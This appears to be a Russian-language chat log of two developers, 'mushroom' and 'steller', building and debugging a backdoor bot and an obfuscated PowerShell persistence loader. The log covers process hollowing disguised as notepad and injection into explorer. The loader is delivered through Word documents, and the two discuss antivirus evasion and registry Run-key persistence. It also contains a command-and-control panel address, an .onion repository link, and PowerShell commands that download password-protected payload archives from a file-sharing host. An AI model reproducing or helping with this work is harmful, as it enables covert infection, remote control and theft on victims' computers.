2020-08-05T09:16:26 mushroom -> steller
Привет какой использовать для тестирования загрузчик? Который ты вчера прислал или тот который в GitLab. Он сегодня обновился.

2020-08-05T09:18:02 mushroom -> steller
Тот который в гит завис. Написал что ждёт 203 секунды до запроса команды, я 15 минут ждал, так и не получил команду.

2020-08-05T09:19:33 steller -> mushroom
Привет. Используй пока рабочий. Там небольшое отличие. А что в логе?

2020-08-05T09:20:02 mushroom -> steller
waiting 302...

2020-08-05T09:20:12 mushroom -> steller
Типа того последняя запись.

2020-08-05T09:20:43 mushroom -> steller
Он получил команду 0 302 и завис больше чем 302 секунды.

2020-08-05T09:23:14 steller -> mushroom
Так это от бота лог.  Странно надо проверить.

2020-08-05T09:23:21 mushroom -> steller
Который ты прислал вчера пока без проблем работает.

2020-08-05T09:24:25 steller -> mushroom
Скоро залью с исправлениями кодировки и https

2020-08-05T09:24:53 mushroom -> steller
OK.

2020-08-05T09:44:10 mushroom -> steller
Когда ошибка происходит во время создания process hollowing посылаешь на сервер код ошибки?

2020-08-05T09:44:21 mushroom -> steller
Can't read target process memory, error: 299
Sleep before getting new command for 300s...

2020-08-05T09:44:41 mushroom -> steller
Получилось что команда на сервере зависла pending.

2020-08-05T09:46:13 mushroom -> steller
Короче произошла ошибка в процессе создания process hollowing и на сервер ничего не отправился код ошибки, он считает что команда выполняется и она постоянно теперь pending.

2020-08-05T09:52:25 steller -> mushroom
Странно у меня работает Sleep before getting new command for 302s...
Пока сделал в конце почти каждой команды посылку GetLastError() на сервер. Описание ошибки не передается.

2020-08-05T09:53:15 mushroom -> steller
Описание не нужно, просто pid: 0 msg: <код ошибки>

2020-08-05T09:53:15 steller -> mushroom
А у тебя ошиба в Sleep before getting new command for 302s...
только с hollowing?

2020-08-05T09:53:41 mushroom -> steller
Это было когда получил команду 0 302.

2020-08-05T09:54:06 steller -> mushroom
Т.е. hollowing не запускал до этого?

2020-08-05T09:54:16 mushroom -> steller
Нет.

2020-08-05T09:54:26 steller -> mushroom
А что запускал?

2020-08-05T09:54:41 mushroom -> steller
Я запустил получил команду 0 302 и всё.

2020-08-05T09:55:02 mushroom -> steller
На сервере сделал команду hollowing, но бот её так и не запросил.

2020-08-05T09:55:26 steller -> mushroom
Понятно. Сейчас сборку с исправлениями кодировки и https залью, может и эта ошибка исправилась.

2020-08-05T09:56:29 mushroom -> steller
Сделай чтобы код ошибки посылался когда команда завершается с ошибкой, на hollowing сейчас ничего не посылается если ошибка в процессе его создания происходит.

2020-08-05T09:56:41 mushroom -> steller
Base relocation virtual address is 75648
Can't read target process memory, error: 299
Sleep before getting new command for 300s...

2020-08-05T09:56:54 mushroom -> steller
299 не пришло на сервер.

2020-08-05T09:57:50 mushroom -> steller
Это я два раза запускал hollowing с таймаутом 0, два раза ошибка 299.

2020-08-05T09:58:20 mushroom -> steller
Программу x64 я запускал, маскировка под notepad.

2020-08-05T09:58:41 mushroom -> steller
6966b29479574d5abb89b8bde1a94a45

2020-08-05T09:59:02 mushroom -> steller
Там можешь увидеть что за программа, и команду.

2020-08-05T10:02:16 steller -> mushroom
Залил. Сейчас попробую воспроизвести твою ошибку. TestOutput64.exe скинешь?

2020-08-05T10:04:42 mushroom -> steller
Download: https://qaz.im/load/Ei4YD3/ibQdeK   
Delete: https://qaz.im/index.php?a=delete&q=395712565
Пароль: u4`55&b5?.Ltbp}<5

2020-08-05T10:06:08 mushroom -> steller
C - это /SUBSYSTEM Console, U - это UNICODE программа, без C это /SUBSYSTEM Windows, без U это ANSI программа.

2020-08-05T10:07:38 mushroom -> steller
Это может быть ошибка из-за не совместимости программ, хотя с таймаутом 60 всё отработало нормально.

2020-08-05T10:07:59 mushroom -> steller
А с 0 третий раз 299 ошибка.

2020-08-05T10:08:12 mushroom -> steller
Попробую под другие программы замаскироваться.

2020-08-05T10:09:20 mushroom -> steller
TestOutput бесконечно выводит в stdout строку Test output

2020-08-05T10:23:53 mushroom -> steller
Можно теперь тестировать версию с GitLab?

2020-08-05T10:27:15 steller -> mushroom
Не, я на boleggers залил. Пока в репе нет изменений этих

2020-08-05T10:28:12 steller -> mushroom
Так должно быть?
https://51.89.125.28:12280/bots/command?id=ed17f68af885a2b91a416e9f2a19389a

2020-08-05T10:28:19 mushroom -> steller
Я имею ввиду загрузчика.

2020-08-05T10:28:27 steller -> mushroom
Посмотри последний вывод

2020-08-05T10:28:53 mushroom -> steller
Да.

2020-08-05T10:28:55 steller -> mushroom
Ты же сказал, что с гита какие-то глюки у него

2020-08-05T10:29:45 mushroom -> steller
У загрузчика?

2020-08-05T10:30:22 mushroom -> steller
Сделай таймаут 0

2020-08-05T10:30:34 mushroom -> steller
background run

2020-08-05T10:31:02 steller -> mushroom
Это я напрямую запустил. Возможно у hollowing какие-то проблемы с запущенным из памяти ботом, хотя зависимости особой не представляю

2020-08-05T10:31:52 steller -> mushroom
Попробую..

2020-08-05T10:32:02 mushroom -> steller
У меня тоже с не нулевым таймаутом работает всё, а с 0 нет.

2020-08-05T10:32:58 mushroom -> steller
0 таймаут это критично, большинство программ именно так и запускают.

2020-08-05T10:33:38 steller -> mushroom
А у тебя notepad при этом отваливается?

2020-08-05T10:34:14 mushroom -> steller
Нет.

2020-08-05T10:34:50 mushroom -> steller
Его нету в списке процессов. Он когда завершение работы системы будет всплывёт с ошибкой.

2020-08-05T10:35:08 mushroom -> steller
Он получается остаётся висеть как испорченный процесс.

2020-08-05T10:39:18 mushroom -> steller
С 0 таймаутом ни одна маскировка не прошла. Сейчас обновлённую версию запущу.

2020-08-05T10:39:34 steller -> mushroom
Т.е. с таймаутом 0 выдать на сервер только OK?

2020-08-05T10:40:00 mushroom -> steller
Если всё прошло без ошибок выдавай просто pid

2020-08-05T10:40:18 mushroom -> steller
Чтобы можно было потом terminаte process по нему сделать.

2020-08-05T10:40:37 mushroom -> steller
А если ошибка pid: 0 msg: <код ошибки>

2020-08-05T10:40:56 mushroom -> steller
pid: 0
msg: <код ошибки>

2020-08-05T10:41:35 mushroom -> steller
Так же как шлёшь stdout, только pid 0, а вместо stdout код ошибки.

2020-08-05T10:42:04 mushroom -> steller
Так загрузчик какой использовать с GitLab или тот что ты присылал вчера?

2020-08-05T10:43:52 mushroom -> steller
GitLab не работает пока. Использую вчерашний загрузчик.

2020-08-05T10:46:50 steller -> mushroom
Да, используй пока рабочий загрузчик.
Ты же сказал, что на репе лежит с глюком загрузчик.

2020-08-05T10:47:21 mushroom -> steller
Вчера так было. Сегодня он обновился.

2020-08-05T10:51:44 steller -> mushroom
А, ну тогда бери с новый, как будет возможность. Там небольшое исправление поиска explorer + исправления ps2.0

2020-08-05T11:11:27 steller -> mushroom
Поправил ошибку с таймаутом 0. Залил в botleggers.
msg тоже сделал, но пока не проверил.

2020-08-05T11:15:08 mushroom -> steller
OK.

2020-08-05T11:45:27 steller -> mushroom
А у тебя случаем шелл-кода нет для установки переменных окружения?

2020-08-05T11:45:46 mushroom -> steller
Нет.

2020-08-05T12:16:55 mushroom -> steller
Когда завершено выполнение файла программы или dll или сценария с сохранением на диск, с ненулевым таймаутом, они удаляются?

2020-08-05T12:22:22 steller -> mushroom
Пока нет. Это пропустил.

2020-08-05T12:23:14 mushroom -> steller
А куда они скачиваются?

2020-08-05T12:23:28 mushroom -> steller
В Temp?

2020-08-05T12:25:27 steller -> mushroom
Да,
TStr GetTmpFile()
{
  char TmpName[FILENAME_MAX];
  kernel32.getTempPathA(FILENAME_MAX, TmpName);
  kernel32.getTempFileNameA(TmpName, nullptr, 0, TmpName);
  return TmpName;
}
Плюс расширение скрипта.

2020-08-05T12:27:52 mushroom -> steller
У exe расширение tmp сейчас было. Это на новых win 10 приводит к показу окна что нету ассоциированной программы с таким типов файлов, сделай чтобы exe было.

2020-08-05T12:38:46 mushroom -> steller
Проверь у себя такую сценарий dir /s C:\Windows\system32, там большой вывод будет, бот правильно отработает, таймаут 60 секунд.

2020-08-05T12:39:25 mushroom -> steller
У меня через 60 секунд бот не убил процесс, до сих пор работает уже 7 минут.

2020-08-05T12:39:54 mushroom -> steller
И ответа не послал на сервер.

2020-08-05T12:41:08 mushroom -> steller
А по идее должен был убить процесс и то что успел вывести процесс отправить на сервер.

2020-08-05T12:41:56 mushroom -> steller
В логах Read timeout бесконечный.

2020-08-05T12:42:30 steller -> mushroom
Сейчас гляну

2020-08-05T12:42:48 mushroom -> steller
Послал результат как только я в ручную убил процесс.

2020-08-05T12:43:11 steller -> mushroom
Это .bat ?

2020-08-05T12:43:21 mushroom -> steller
Да.

2020-08-05T12:45:08 mushroom -> steller
Я запускал с сохранением на диск, но думаю разницы не будет.

2020-08-05T12:53:21 steller -> mushroom
Да, через pipe то же самое. У тебя много файлов вывелись?

2020-08-05T12:53:55 mushroom -> steller
Много. Пока я его не убил в таск менеджере.

2020-08-05T12:54:07 mushroom -> steller
6966b29479574d5abb89b8bde1a94a45 смотри там.

2020-08-05T12:54:22 mushroom -> steller
Предпоследняя команда.

2020-08-05T12:57:23 mushroom -> steller
После этого сделал с сохранением на диск cd c:\ dir powershell тоже 60 секунд таймаут прошёл и тишина, убил в ручную пришёл ответ.

2020-08-05T12:58:12 mushroom -> steller
Там тоже Read timeout бесконечно, пока процесс не убил.

2020-08-05T13:06:05 mushroom -> steller
После этой команды с большим выводом теперь постоянно приходится в ручную процесс убивать. Получается она попортила там что то в боте.

2020-08-05T13:07:09 mushroom -> steller
Теперь даже такой сценарий без сохранения на диск cd c:\\r\ndir\r\n для powershell после отработки не отправляет результат пока его не убить. Read timeout постоянно.

2020-08-05T13:15:34 steller -> mushroom
Это я баг один исправил случайно другой добавился. Проверка таймаута исчезла. Сейчас новую сборку залью.

2020-08-05T13:17:08 steller -> mushroom
Залил

2020-08-05T13:59:16 steller -> mushroom
Добавил к временному файлу .exe
Исправил удаление файла для CreateProcess и .bat/.ps1 dump.

2020-08-05T13:59:33 mushroom -> steller
OK.

2020-08-05T14:00:07 mushroom -> steller
Dll тоже удаляется?

2020-08-05T14:00:48 mushroom -> steller
Которая с помощью rundll32.exe запускается.

2020-08-05T14:04:15 mushroom -> steller
Что то не удалился bat. Может я запустил старую версию?

2020-08-05T14:04:29 mushroom -> steller
Ты залил новую уже?

2020-08-05T14:07:38 mushroom -> steller
По поводу переменных PARENT, PARENTID, VARS. Может быть палевно что они устанавливаются глобально для пользователя, а не для процесса.

2020-08-05T14:07:57 mushroom -> steller
Ты их используешь в боте?

2020-08-05T14:13:52 steller -> mushroom
Да, залил.
А ты поставил таймаут?
Про преременные помню, смотрю как их через шеллкод внедрить.
Может пока отключить т.к. они сейчас не используются?

2020-08-05T14:15:04 mushroom -> steller
Да можно отключить если не используешь. По факту только VARS нужна, в ней группа написана, но и она пока не используется. Но на будущее они будут нужны, VARS точно.

2020-08-05T14:15:31 steller -> mushroom
Хотя, скиптам могут понадобиться и др. процессам

2020-08-05T14:15:49 mushroom -> steller
Да таймаут 60 сек использовал. Сейчас ещё раз проверю.

2020-08-05T14:17:13 steller -> mushroom
exe у меня точно удалялись.
Может bat заблокирован cmd. Сейчас проверю

2020-08-05T14:22:46 mushroom -> steller
Не удалился.

2020-08-05T14:32:44 mushroom -> steller
И ps1 не удаляется.

2020-08-05T14:34:58 steller -> mushroom
Нашел багу.

2020-08-05T14:36:23 steller -> mushroom
Сейчас должно удаляться, посмотри

2020-08-05T14:45:13 mushroom -> steller
Удалился.

2020-08-05T14:50:34 mushroom -> steller
Заметил одну вещь. Если команда например сценарий отработал раньше таймаута, всё равно бот дожидается таймаута , и только потом отправляет результат.

2020-08-05T14:51:01 mushroom -> steller
ps1 удалился тоже.

2020-08-05T14:53:19 steller -> mushroom
Ты имеешь ввиду через pipe?

2020-08-05T14:53:47 mushroom -> steller
ps1 удалился файл я имею ввиду.

2020-08-05T14:55:11 steller -> mushroom
Нее. Бот дожидатся таймаута для скриптов т.к. при использовании pipe скрипты самостоятельно не завершаются

2020-08-05T14:55:14 mushroom -> steller
exe тоже удалился.

2020-08-05T14:56:10 steller -> mushroom
С них же нужно stdout/error собрать, поэтому они работают до таймаута

2020-08-05T14:57:40 mushroom -> steller
Например команда dir выполнилась и больше ничего нету в сценарии, а бот всё равно ждёт таймаута.

2020-08-05T14:58:21 mushroom -> steller
А если поставитьтаймаут несколько часов, а программа выполнилась за 5 минут, будет ждать несколько часов?

2020-08-05T14:58:26 steller -> mushroom
Так как ты узнаешь программно что dir завершилась?

2020-08-05T14:58:35 mushroom -> steller
По логу вижу.

2020-08-05T14:58:56 steller -> mushroom
Программно видишь?)

2020-08-05T14:59:15 mushroom -> steller
В логе вывод вижу dir.

2020-08-05T14:59:39 mushroom -> steller
И потом до таймаута Read timeout постоянно.

2020-08-05T15:00:03 mushroom -> steller
И в конце Command was timed out. Terminate cmd process.

2020-08-05T15:00:05 steller -> mushroom
Это попытка чтения из stdout

2020-08-05T15:01:23 steller -> mushroom
Для скриптов так и должно быть, в общем

2020-08-05T15:01:59 mushroom -> steller
Таймаут 12 часов для dir поставил, сейчас посмотрю как он пришлёт ответ.

2020-08-05T15:03:08 steller -> mushroom
А смысл?

2020-08-05T15:04:12 mushroom -> steller
Может же быть что сделают таймаут для программы большой, а она за 5 минут отработает, будут ждать в пустую результата.

2020-08-05T15:05:37 mushroom -> steller
TShell::Read(StdOut):


    Каталог: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        29.05.2020     11:20                AMD
d-----        24.07.2020     13:21                LLVM
d-----        07.12.2019     12:14                PerfLogs
d-r---        31.07.2020     15:35                Program Files
d-r---        15.07.2020     12:05                Program Files (x86)
d-----        27.05.2020     13:55                Qt
d-----Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout

2020-08-05T15:05:49 mushroom -> steller
И так 12 часов получается будет.

2020-08-05T15:06:21 steller -> mushroom
Ну, если заняться нечем можешь и 12 поставить

2020-08-05T15:06:46 mushroom -> steller
А если 1 час поставят, а программа 30 сек отработает.

2020-08-05T15:06:53 steller -> mushroom
Я ж тебе говорю: это ограничения реализации

2020-08-05T15:07:01 mushroom -> steller
Час в пустую уйдёт.

2020-08-05T15:07:12 steller -> mushroom
Не программа, а скрипт

2020-08-05T15:08:05 mushroom -> steller
То есть за процессом скрипта нельзя следить так же как за процессом программы?

2020-08-05T15:10:58 steller -> mushroom
Ну, да. Все команды через stdin сваливаются в консоль, которая ожидает команд, а потом все так же собирается через stdout. А консль работает до таймаута.

2020-08-05T15:11:50 steller -> mushroom
В винде нет такого события консоль-выполнила-все-команды.

2020-08-05T15:12:15 mushroom -> steller
У меня так же, только там ожидание или таймаут или завершение работы cmd например.

2020-08-05T15:13:46 steller -> mushroom
Т.е. ты имеешь ввиду сделать обертку cmd /c "..." и ждать её завершения, а потом закрыть консоль?

2020-08-05T15:13:58 mushroom -> steller
А reset работает если например в данный момент команда выполняется? Команда прервётся?

2020-08-05T15:14:16 mushroom -> steller
Работает.

2020-08-05T15:15:27 mushroom -> steller
Да. Ждать или завершения или таймаута, что быстрее произойдёт.

2020-08-05T15:15:52 mushroom -> steller
И PowerShell так же.

2020-08-05T15:16:19 mushroom -> steller
WaitForSingleObject с таймаутом.

2020-08-05T15:18:33 steller -> mushroom
И после него stdout можно прочитать?

2020-08-05T15:19:00 mushroom -> steller
stdout в буфер читается.

2020-08-05T15:19:04 mushroom -> steller
А у тебя как?

2020-08-05T15:20:50 steller -> mushroom
После закрытия консоли ничего не прочитаешь.
А можно читать как-то не в буфер?

2020-08-05T15:22:00 mushroom -> steller
Если после закрытия не прочитаешь, наверное нет. Если нету возможности всё прочитать сразу перед закрытием.

2020-08-05T15:23:49 steller -> mushroom
Ну, так PeekNamedPipe только с открытой консоли читает, т.е. как она закроется, так остаток пропадет.

2020-08-05T15:24:19 steller -> mushroom
сразу после WaitForSingleObject последний кусок потеряется

2020-08-05T15:25:11 mushroom -> steller
У меня читается пока работает процесс. Как процесс закончился, функция readFile возвращает FALSE.

2020-08-05T15:25:52 mushroom -> steller
А у тебя как читается сразу разом всё?

2020-08-05T15:26:00 mushroom -> steller
Или по мере поступления?

2020-08-05T15:27:07 steller -> mushroom
PeekNamedPipe выдает сколько читать можно

2020-08-05T15:28:32 mushroom -> steller
У меня так. Создал пайп и вызвал функцию такую:
_Success_(return != 0)
BOOL readPipe(_In_ HANDLE pipe, _Outptr_ PBYTE* buffer, _Out_ PSIZE_T size)
{
    DWORD readed = 0;
    DWORD needed = 0;
    DWORD offset = 0;

    BYTE tmp[4096];
    DWORD resultSize = 4096;
    PBYTE result = (PBYTE)HeapAlloc(GetProcessHeap(), 0, resultSize);
    if (!result)
        return FALSE;

    while (kernel32.readFile(pipe, tmp, 4096, &readed, NULL))
    {
        needed += readed;
        if (resultSize < needed)
        {
            PBYTE tmp = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, result, needed);
            if (!tmp)
            {
                HeapFree(GetProcessHeap(), 0, result);
                return FALSE;
            }

            result = tmp;
            resultSize = needed;
        }

        CopyMemory(&result[offset], tmp, readed);
        offset += readed;
    }

    *buffer = result;
    *size = offset;
    return TRUE;
}

2020-08-05T15:29:10 mushroom -> steller
И она в отдельном потоке, чтобы не блокировать. Она закончиться как раз как только процесс завершиться.

2020-08-05T15:29:25 mushroom -> steller
Типа так у меня.

2020-08-05T15:30:30 steller -> mushroom
А посмотри код https://n4iaacb37wmqclht.onion/steller/backdoor/blob/master/backdoor/stdio-pipe.cpp

2020-08-05T15:32:02 mushroom -> steller
Нету доступа.

2020-08-05T15:32:37 steller -> mushroom
Открыл

2020-08-05T15:33:44 mushroom -> steller
Это в общем не критично что так ждёт таймаута всегда, но могут быть ожидания как я говорил в пустую. Смотря как этот бот будут использовать.

2020-08-05T15:33:45 mushroom -> steller
403

2020-08-05T15:34:17 steller -> mushroom
А сейчас?

2020-08-05T15:34:25 mushroom -> steller
Появился.

2020-08-05T15:35:53 mushroom -> steller
Там тоже в буфер читается.

2020-08-05T15:36:28 mushroom -> steller
Там получается не в отдельном потоке, а каждые 100 мсек читается.

2020-08-05T15:36:46 mushroom -> steller
Чтобы не блокировать основной поток.

2020-08-05T15:37:24 mushroom -> steller
Типа как функция, которую я выше писал.

2020-08-05T15:37:38 mushroom -> steller
Вот эта bool TStdIoPipe::Read(TStr &StdOut, TStr &StdErr, int TimeoutMs)

2020-08-05T15:38:43 mushroom -> steller
Получается читается в процессе работы (каждые 100 мсек).

2020-08-05T15:39:28 mushroom -> steller
А у меня в отдельном потоке в блокирующем виде читается, по этому точно прочитается всё что вывел процесс пока работал.

2020-08-05T15:40:08 mushroom -> steller
kernel32.readFile(pipe, tmp, 4096, &readed, NULL) не вернёт FALSE пока процесс не закроет пайп свой.

2020-08-05T15:43:11 steller -> mushroom
Это понятно. А если оболочка закроется в момент когда у тебя буфер копируется, данные могуть пропасть, она же не будет у тебя ждать пока дойдет до ReadFile&

2020-08-05T15:44:09 mushroom -> steller
Ничего не будет. В пайпе свой буфер, из него данные копируются в буфер.

2020-08-05T15:44:40 mushroom -> steller
Когда создаёшь пайп можно размер этого внутреннего буфера указывать.

2020-08-05T15:45:41 steller -> mushroom
Надо проверить, может действительно это лучший вариант.
Ладно пойду. До связи.

2020-08-05T15:45:50 mushroom -> steller
Пока.

2020-08-11T15:11:22 mushroom -> steller
Привет. PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)
At C:\Users\TestUser\AppData\Local\Temp\AF05.ps1:1855 char:9
+         Throw ((("{4}{11}{16}{23}{10}{21}{8}{2}{14}{6}{0}{13}{7}{15}{ ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (PE platform doe...d in (32/64bit):String) [], RuntimeException
    + FullyQualifiedErrorId : PE platform doesn't match the architecture of the process it is being loaded in (32/64bi
   t)

2020-08-11T15:12:06 mushroom -> steller
Это когда запускает загрузчик 32 битный word. Когда 64 битный ошибок нет.

2020-08-11T15:14:56 steller -> mushroom
Привет. Это с гитлаба?

2020-08-11T15:17:17 mushroom -> steller
Нет

2020-08-11T15:18:37 mushroom -> steller
Тоже самое попробовал запустить загрузчик из powershell x86 версии/

2020-08-11T15:19:41 steller -> mushroom
Ну, и как, работает?

2020-08-11T15:20:02 mushroom -> steller
Такая же ошибка.

2020-08-11T15:20:39 mushroom -> steller
x64 работает, а x86 нет.

2020-08-11T15:21:17 steller -> mushroom
Понятно. Ты лучше с гитлаба бери новую.
Сейчас проверю эту ошибку

2020-08-11T15:24:36 steller -> mushroom
Кстати из ТЗ:
6.1. Если запущен лоадер x86 на машине x64, он первым делом должен обновиться
 до x64 версии себя же, и далее загружать только x64 бота.

Значит, что на x64 битной машине нужно запускать только x64 бота и соотв.

2020-08-11T15:25:28 steller -> mushroom
Ты на win 32bit тестил?

2020-08-11T15:26:06 mushroom -> steller
Я тестил на 64 битной Win 10 c Office 32 битным.

2020-08-11T15:26:42 steller -> mushroom
Получается, для чистоты эксперимента нужно 32 битную ОС

2020-08-11T15:26:49 steller -> mushroom
использовать

2020-08-11T15:27:53 mushroom -> steller
Значит для Office 32 битного гарантированно работать не будет? У многих он 32 битный стоит, а Windows 64 битная.

2020-08-11T15:29:55 steller -> mushroom
А ты в офис внедряешь?
В загрузчике же explorer прописан.

2020-08-11T15:30:55 mushroom -> steller
В документ Word сценарий твой вставляю, он при открытии вытаскивается на диск и запускается.

2020-08-11T15:32:05 mushroom -> steller
Получается процесс 32 битный создаётся, так как Word 32 битный.

2020-08-11T15:32:21 steller -> mushroom
Сценарий от битности офиса не зависит.
Он загружает бота соотв. битности системы.
И внедряет его в explorer.
Где-то на последнем этапе ошибка.

2020-08-11T15:33:20 steller -> mushroom
У меня недавно было обновление нахождения битности:
$Is64Sys = ($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
Ты можешь через офис её запустить?

2020-08-11T15:33:39 mushroom -> steller
Я просто запускаю сценарий из 32 битного процесса, получается запускается powershell x86 запускает сценарий.

2020-08-11T15:33:50 steller -> mushroom
Раньше ненадежный код определения был

2020-08-11T15:34:57 steller -> mushroom
Да, он false выдаёт в нем.

2020-08-11T15:41:09 mushroom -> steller
Я попробую указывать полный путь к powershell чтобы бралась таже битнгсть что и у системы.

2020-08-11T15:43:50 steller -> mushroom
Это в скрипте. Сейчас поправлю.

2020-08-11T15:43:55 steller -> mushroom
*ошибка

2020-08-11T15:45:48 steller -> mushroom
Попробуй этот:
D:\Project\backdoor\persist-loader\persist-loader.obf.ps1
Dowload URL:
https://file.io/lgX3Rdgrpt35
Pass:
8-%Ev?zLW9B)wP3m{23!
Download command:
powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/lgX3R
dgrpt35', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"8-%Ev?zLW9B)wP3m
{23!" 1.rar

2020-08-11T15:47:05 mushroom -> steller
Завтра попробую с ним документ сделать.

2020-08-11T15:47:31 steller -> mushroom
Да, давай. Там исправил определение битности ОС

2020-08-12T09:37:14 mushroom -> steller
Привет. Не работает так же с Word 32 загрузчик, который ты вчера прислал.

2020-08-12T09:42:00 steller -> mushroom
Привет.
Сейчас проверю.

2020-08-12T09:55:25 steller -> mushroom
Обновил x86 бота.
У меня работает.

2020-08-12T09:55:58 mushroom -> steller
Можно проверять?

2020-08-12T09:56:13 steller -> mushroom
Подожди, сейчас x86 проверю)

2020-08-12T09:56:38 mushroom -> steller
Проверь так. Запусти загрузчик из под PowerShell x86.

2020-08-12T09:57:17 steller -> mushroom
И в win7 32 бит тоже

2020-08-12T09:59:31 mushroom -> steller
PowerShell x86 запусти в 64 битной Windows и запусти так загрузчик. Тогда ошибка и происходит.

2020-08-12T09:59:51 steller -> mushroom
Да, у же вижу.

2020-08-12T10:13:27 steller -> mushroom
А ты можешь из Word 32 запускать 64 битный ps?

2020-08-12T10:35:27 mushroom -> steller
Я пробовал запускать powershell по прямому адресу? такая же ошибка. Хотя по этому пути лежит 64 битный powershell.

2020-08-12T10:36:53 mushroom -> steller
Получается что Word 32 битный всё равно влияет, он запускает powershell.

2020-08-12T10:41:34 steller -> mushroom
У тебя же ps в НЕ в адресном пространстве ворда запускается?

2020-08-12T10:43:49 mushroom -> steller
32 битная программа всё равно запускает 32 битные программы. Как пути не указывай.

2020-08-12T10:44:01 steller -> mushroom
Так у тебя же скрипт.

2020-08-12T10:44:14 mushroom -> steller
word просто запускает процесс powershell

2020-08-12T10:46:01 steller -> mushroom
Потестил на win x86 - работает

2020-08-12T10:46:51 steller -> mushroom
Нужно как-то из ворда запустить x64. Можно задачу создать, например. Зачем напрямую запускать?

2020-08-12T10:48:08 mushroom -> steller
Создание задач палится антивирусом сразу.

2020-08-12T10:48:31 mushroom -> steller
Проверить в POwerShell нельзя что это Wow64 процесс?

2020-08-12T10:49:46 mushroom -> steller
Я попробую так C:\Windows\Sysnative

2020-08-12T10:50:17 steller -> mushroom
Да. Там всё проверяется. Есть ограничение на использование IntPtr:
#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly

2020-08-12T10:51:25 steller -> mushroom
Загрузчик на ps использует reg->run. Почему твой скрипт должен палиться?

2020-08-12T10:52:41 mushroom -> steller
Это автозагрузка.

2020-08-12T10:53:39 steller -> mushroom
Скрипту на ps не палевно, а на vba палевно?

2020-08-12T10:54:23 mushroom -> steller
Автозагрузка не подходит, тогда только после перезагрузки запустится сценарий.

2020-08-12T10:54:43 steller -> mushroom
А бот тоже после перезагрузки запустится

2020-08-12T10:55:15 mushroom -> steller
По факту так сейчас и происходит. Не запускается сразу из-за ошибки, а после перезагрузки запускается.

2020-08-12T10:57:41 steller -> mushroom
В ps скрипте используется разадресация указателей intptr для вызова winai. Похоже, их никак не заменить, например, на uint64.
Придется скорее всего нужный ps запускать.

2020-08-12T10:58:11 mushroom -> steller
Я попробую сейчас так C:\Windows\Sysnative

2020-08-12T10:58:31 mushroom -> steller
Чтобы переадресация не работала в 32 битном ппроцессе на WOW64

2020-08-12T11:33:41 mushroom -> steller
Можешь сделать так? Запускается сценарий загрузчика, если это Wow64 процесс, перезапускает сам себя, но уже так %windir%\sysnative\windowspowershell\v1.0\powershell.exe <загрузчик>

2020-08-12T11:37:17 steller -> mushroom
Попробую

2020-08-12T11:39:31 mushroom -> steller
sysnative работает только для 32 битного Wow64 процесса, если в 64 битном процессе написать sysnative не прокатит, по этому надо обязательно проверять что это Wow64 процесс, перед использованием sysnative в пути.

2020-08-12T12:11:17 steller -> mushroom
Сделал перезапуск в x64. Работает из ps x86
D:\Project\backdoor\persist-loader\persist-loader.obf.ps1
Dowload URL:
https://file.io/ERZbY2BlXMZN
Pass:
yr-(t^<+VlIGbb#C_VvZ
Download command:
powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/ERZbY
2BlXMZN', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"yr-(t^<+VlIGbb#C
_VvZ" 1.rar

2020-08-12T12:15:02 mushroom -> steller
OK. Посмотрю/

2020-08-12T12:28:25 mushroom -> steller
Заработало.

2020-08-12T12:30:13 steller -> mushroom
Отлично 👍

2020-08-19T12:40:30 steller -> mushroom
Привет.
Меня на следующей неделе не будет.
Нужно ли что-нибудь потестить, добавить или сборку сделать?

2020-08-19T12:56:44 mushroom -> steller
Привет. Нет. Всё что есть хватает. Надо будет только делать для бота https. Ждём Бузу чтобы твой комплект в работу отдать.

2020-08-19T12:57:20 mushroom -> steller
А буза будет только после 29 августа.

2020-08-19T12:58:55 steller -> mushroom
Так там уже есть https

2020-08-19T12:59:50 steller -> mushroom
x86 бот ты пробовал?

2020-08-19T13:01:53 mushroom -> steller
Нет. Не пробовал.

2020-08-19T13:19:17 mushroom -> steller
То может загрузчик и бот при необходимости запросы все слать через https?

2020-08-19T13:26:14 steller -> mushroom
В последних сборках через https используется.

2020-08-19T14:32:23 mushroom -> steller
Сейчас смотрел runbat channel 60 cd c:\\r\ndir\r\n

2020-08-19T14:32:34 mushroom -> steller
Ответ пустой.

2020-08-19T14:32:42 mushroom -> steller
pid:	13992
stdout:	
stderr:	

msg:	0

2020-08-19T14:37:38 mushroom -> steller
runpws channel 60 cd c:\\r\ndir\r\n

2020-08-19T14:38:04 mushroom -> steller
Ответ не приходит. В логах Posting command result...

2020-08-19T14:38:19 mushroom -> steller
А в админке эта команда pending...

2020-08-19T14:43:07 mushroom -> steller
Всё остальное вроде нормально. Сценарии без сохранения на диск проверь.

2020-08-19T15:03:34 mushroom -> steller
Протестируй все команды запуска процесса и все команды запуска сценариев.

2020-08-19T15:05:33 mushroom -> steller
Рандомно не приходит ответ на команды запуска процессов, пишет pending...

2020-08-19T15:06:14 mushroom -> steller
6966b29479574d5abb89b8bde1a94a45 я запускал разные. Можешь увидеть что там ответы на некоторые не пришли.

2020-08-19T15:06:18 steller -> mushroom
В прошлый раз какие-то глюки с серваком были. Именно pending был

2020-08-19T15:06:58 mushroom -> steller
Может глюки и сейчас.

2020-08-19T15:06:59 mushroom -> steller
runbat channel 60 cd c:\\r\ndir\r\n

2020-08-19T15:07:08 mushroom -> steller
Ответ пустой, проверь.

2020-08-19T15:07:36 steller -> mushroom
Да, вижу. Уже тестирую

2020-08-19T15:14:56 steller -> mushroom
 <mushroom> runbat channel 60 cd c:\\r\ndir\r\n
Здесь \ забыл

2020-08-19T15:15:46 mushroom -> steller
cd c:\\r\ndir\r\n

2020-08-19T15:16:00 mushroom -> steller
Где там \ забыл?

